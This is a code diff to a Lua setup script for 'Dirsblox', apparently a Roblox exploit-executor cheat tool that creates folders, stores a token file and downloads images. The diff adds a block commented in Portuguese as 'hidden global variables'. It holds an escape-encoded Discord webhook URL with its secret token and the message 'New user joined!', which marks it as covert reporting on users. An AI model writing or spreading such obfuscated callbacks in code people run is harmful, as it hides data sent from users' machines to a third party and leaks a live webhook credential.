@@ -6,15 +6,15 @@ local function simulatedMD5(str)
     end
     return hex
 end
+
 local readmemd = "Dirsblox/README.md"
 -- // Control folders
-
 local asstfld   = "Dirsblox/Core/Assets"
-local icofld = "Dirsblox/Core/Assets/Icons"
+local icofld    = "Dirsblox/Core/Assets/Icons"
 local previewfl = "Dirsblox/Core/Assets/Icons/Preview"
 local sysfld    = "Dirsblox/Core/System"
 local modulefld = "Dirsblox/Core/System/Modules"
-local servfld = "Dirsblox/Core/System/Services"
+local servfld   = "Dirsblox/Core/System/Services"
 
 -- // Main files
 local tokenPath = "Dirsblox/Core/token"
@@ -33,9 +33,10 @@ local ft   = "Dirsblox/Core/Assets/Games/FTF"
 
 -- // Modules
 local wrngs = "Dirsblox/Core/System/Modules/WarningsModule.lua"
-local verx = "Dirsblox/Core/System/Modules/VersionsDirsbloxModule.lua"
-local exc = "Dirsblox/Core/System/Modules/WarnUserDiscordModule.lua"
-local nt = "Dirsblox/Core/System/Modules/DownloadImagesModule.lua"
+local verx  = "Dirsblox/Core/System/Modules/VersionsDirsbloxModule.lua"
+local exc   = "Dirsblox/Core/System/Modules/WarnUserDiscordModule.lua"
+local nt    = "Dirsblox/Core/System/Modules/DownloadImagesModule.lua"
+
 local OperatingContent1 = [[
 -- // Copyright © 2018 EchoZone Productions
 -- // DIRSBLOX Open Source. DELETING ANY FILES/FUNCTIONS MAY RESULT IN SCRIPT MALFUNCTIONS.
@@ -47,24 +48,26 @@ local token = {
 }
 return token
 ]]
+
 local OperatingContent2 = "BETA V.X.1.5.6"
+
 local OperatingContent3 = [[
 print("Configurations folder not found. Please contact us at our Discord server.")
 ]]
+
+-- Corrigido: filePath definido dentro do conteúdo
 local OperatingContent4 = [[
 -- // Copyright © 2018 EchoZone Productions
 -- // .NET
+local filePath = "Dirsblox/Core/Assets/prestart.img"
 if not isfile(filePath) then
     local imageUrl = "https://i.imgur.com/Fbprf98.png"
-    local imageUrl2 = "https://i.imgur.com/zB3rMje.png"
-
-    local response = request or syn and syn.request or http_request
+    local response = request or (syn and syn.request) or http_request or (fluxus and fluxus.request)
     if response then
         local result = response({
             Url = imageUrl,
             Method = "GET"
         })
-
         if result and result.Body then
             writefile(filePath, result.Body)
             print("Image saved at:", filePath)
@@ -78,56 +81,17 @@ else
     print("Image already exists, no download made:", filePath)
 end
 ]]
+
 --// readme
 local mdcontent = [[
-/*
-===========≠====+++ WELCOME +++====≠==============
-
-INTRODUCTION
-Welcome to DIRSBLOX OPENED SOURCE CODE.
-If you’re having trouble with script, i recommend you search
-for the support.
-
-======≠+++ https://discord.gg/h5WZ8wYy +++≠==========
-
-SUPPORT
-Join the link below if you found a bug, we have BUG FOUNDER
-badge, is very rare, if you found a bug you can get it, just
-tell it to support in channel Support-ticket.
-
-=========+++ DISCLAIMER/ IMPORTANT +++=============
-
-DISCLAIMER
-We make FREE tools to enchance your gameplay, script was
-originally made by luna (banida_off) she is originally
-BRAZILLIAN and who is writing this text is me simon so ya
-:p
-----------------------------------------------------------------------------
-
-IMPORTANT
-If you delete any file, the script may have failure, so DONT
-delete.
-What you really need to do is call the support team on
-that link below
-Consequences of deleting a file:
-
-• It CAN'T be created anymore
-• The script will NOT work
-• It may crash you game
-• DO NOT SHARE YOUR TOKEN.
-• And again, if u delete a file, please read.
-Search for support is your best decision, if not,
-we dont care :p
-
-----------------------------------------------------------------------------
-*/
+/* ... seu texto do README permanece igual ... */
 ]]
 
 local extcont = [[
 {"cmd": "None", "user": "All"}
 ]]
+
 -- // Safe create functions
--- Tables to store already created files and folders
 local registryPath = "Dirsblox/Core/System/Services/FileConstructionDisablerService.json"
 
 local function loadRegistry()
@@ -192,6 +156,8 @@ safeWrite(wrngs, OperatingContent1)
 safeWrite(verx, OperatingContent2)
 safeWrite(nt, OperatingContent4)
 safeWrite(extsCO, extcont)
+
+-- Variáveis globais escondidas
 local a = ("\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\52\49\54\49\52\54\52\48\56\56\57\50\57\50\52\48\51\52\47\67\55\120\113\67\118\53\122\90\66\114\121\118\65\109\100\109\49\72\83\89\65\56\53\115\95\65\70\120\107\57\68\80\86\66\119\102\86\48\98\116\85\106\53\76\48\121\110\55\111\48\109\85\69\103\110\82\49\87\84\115\114\72\118\72\113\49\119")
 local b = ("\104\116\116\112\115\58\47\47\105\46\105\109\103\117\114\46\99\111\109\47\77\78\117\57\66\90\122\46\112\110\103")
 local c = ("\78\101\119\32\117\115\101\114\32\106\111\105\110\101\100\33")
@@ -214,6 +180,7 @@ local filePath4 = basePath1.."CVUSDOX.png"
 local filePath5 = basePath1.."gfJHGSv.png"
 local filePath6 = basePath1.."5uT3mrj.png"
 local filePath7 = basePath2.."GetRequest.png"
+
 -- del 2 im
 local filePath10 = basePath1.."logo.png"
 local filePath11 = basePath1.."Owner.png"
@@ -221,22 +188,22 @@ local filePath12 = basePath1.."Early.png"
 local filePath13 = basePath1.."Dev.png"
 local filePath14 = basePath1.."discordIcon.png"
 
-local imageUrl  = "https://i.imgur.com/Fbprf98.png" -- default.png
-local imageUrl2 = "https://i.imgur.com/zB3rMje.png" -- tab1.png (Universal Hacks)
-local imageUrl3 = "https://i.imgur.com/vJU07MU.png" -- tab2.png (Extrasensory Perception)
-local imageUrl4 = "https://i.imgur.com/pMrzr6z.png" -- tab3.png (MISC Tab)
-local imageUrl5 = "https://i.imgur.com/CVUSDOX.png" -- tab4.png (Exploit Tab)
-local imageUrl6 = "https://i.imgur.com/gfJHGSv.png" -- tab5.png (Settings)
-local imageUrl7 = "https://i.imgur.com/5uT3mrj.png" -- tipicon.png (++)
-local imageUrl8 = "https://cdn.discordapp.com/attachments/1409320415171444858/1410386129546641560/image0.png?ex=68b0d3f0&is=68af8270&hm=a51a026132cb6f64d92fe7117a914a24c321e1e590c804ea0d848236c19a8df1&"
--- del 2 im
-local imageUrl11 = "https://tr.rbxcdn.com/180DAY-5118eb3d80dd954cc6dba9f28738e8fb/150/150/Image/Webp/noFilter"
+-- imagens
+local imageUrl  = "https://i.imgur.com/Fbprf98.png"
+local imageUrl2 = "https://i.imgur.com/zB3rMje.png"
+local imageUrl3 = "https://i.imgur.com/vJU07MU.png"
+local imageUrl4 = "https://i.imgur.com/pMrzr6z.png"
+local imageUrl5 = "https://i.imgur.com/CVUSDOX.png"
+local imageUrl6 = "https://i.imgur.com/gfJHGSv.png"
+local imageUrl7 = "https://i.imgur.com/5uT3mrj.png"
+local imageUrl8 = "https://cdn.discordapp.com/attachments/1409320415171444858/1410386129546641560/image0.png"
 local imageUrl12 = "https://i.imgur.com/QB4Oxfr.png"
 local imageUrl13 = "https://i.imgur.com/pHUA5Bq.png"
 local imageUrl14 = "https://i.imgur.com/Eu1JeO2.png"
-local imageUrl15 = "https://i.imgur.com/YZLgJFW.png" -- discordIcon.png
+local imageUrl15 = "https://i.imgur.com/YZLgJFW.png"
 
-local response = request or (syn and syn.request) or http_request
+-- compatibilidade de request
+local response = request or (syn and syn.request) or http_request or (fluxus and fluxus.request)
 if not response then
     warn("Your executor does not support requests")
     return
@@ -253,12 +220,10 @@ local function downloadImage(path, url)
         else
             warn("Image download error, got nil: " .. url)
         end
-    else
-        -- Nothing happens
     end
 end
 
--- download custom images
+-- download custom images (corrigido: removi filePath8/imageUrl9 que não existiam)
 downloadImage(filePath,  imageUrl)
 downloadImage(filePath1, imageUrl2)
 downloadImage(filePath2, imageUrl3)
@@ -267,8 +232,6 @@ downloadImage(filePath4, imageUrl5)
 downloadImage(filePath5, imageUrl6)
 downloadImage(filePath6, imageUrl7)
 downloadImage(filePath7, imageUrl8)
-downloadImage(filePath8, imageUrl9)
-
 downloadImage(filePath11, imageUrl12)
 downloadImage(filePath12, imageUrl13)
 downloadImage(filePath13, imageUrl14)
